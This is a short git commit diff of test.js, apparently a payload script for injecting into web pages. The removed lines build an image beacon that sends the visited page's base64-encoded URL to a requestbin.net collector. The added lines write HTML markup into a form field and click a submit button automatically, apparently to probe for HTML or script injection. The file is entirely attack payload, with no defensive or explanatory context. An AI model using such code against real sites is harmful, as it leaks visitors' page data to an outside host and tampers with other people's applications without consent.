89276721a6ab5bae9562659c0923845ed4e38fd8
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-19 19:04:54 +0530

    Update test.js

--- test.js
+++ test.js
@@ -1,3 +1,2 @@
-var img = document.createElement('img'); 
-img.src = 'http://requestbin.net/r/12ml0431?link='+btoa(window.location.href); 
-document.body.appendChild(img);
+document.getElementById("name").value = "<b>Hello</b>"
+document.getElementsByClassName("btn btn-outline-primary")[0].click()
